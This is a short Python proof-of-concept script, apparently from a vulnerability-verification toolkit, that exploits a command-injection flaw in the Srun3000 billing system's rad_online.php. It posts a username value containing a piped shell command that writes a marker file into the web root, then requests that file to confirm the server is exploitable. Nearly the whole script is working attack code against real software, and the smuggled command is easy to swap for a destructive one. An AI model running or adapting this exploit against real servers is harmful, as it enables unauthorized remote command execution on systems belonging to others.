#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 深澜软件srun3000计费系统rad_online.php参数username命令执行
referer: http://www.wooyun.org/bugs/WooYun-2014-62299
author: Lucifer
description: 文件rad_online.php中,post参数username存在命令执行漏洞。
'''
import sys
import json
import requests
import warnings


class rad_online_username_rce_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['深澜软件srun3000计费系统rad_online.php参数username命令执行', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/rad_online.php"
        vulnurl = self.url + payload
        post_data = {
            "username":'1|echo "81dc9bdb52d04dc20036dbd8313ed055">/srun3/web/hit.txt',
            "password":"123"
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            shellurl = self.url + "/hit.txt"
            req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                result[2] = '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshellurl: "+shellurl
            else:
                result[2] = '不存在'
        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = rad_online_username_rce_BaseVerify(sys.argv[1])
    testVuln.run()
